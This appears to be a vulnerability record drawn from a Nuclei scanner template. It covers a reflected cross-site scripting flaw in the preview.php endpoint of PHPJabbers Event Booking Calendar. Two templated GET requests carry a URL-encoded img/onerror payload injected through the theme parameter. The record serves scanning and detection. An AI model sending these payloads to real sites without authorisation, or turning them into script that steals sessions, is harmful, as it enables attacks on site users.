# Vulnerability: PHPJabbers Event Booking Calendar - Reflected XSS
**Classification:** PHPJABBERS
**Source:** Nuclei Template (`phpjabbers-event-booking-xss.yaml`)

## Description
Detected that PHPJabbers Event Booking Calendar contained a reflected cross-site scripting vulnerability in the preview.php endpoint

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/scripts/event-booking-calendar/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3Etest
GET {{BaseURL}}/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3Etest
```

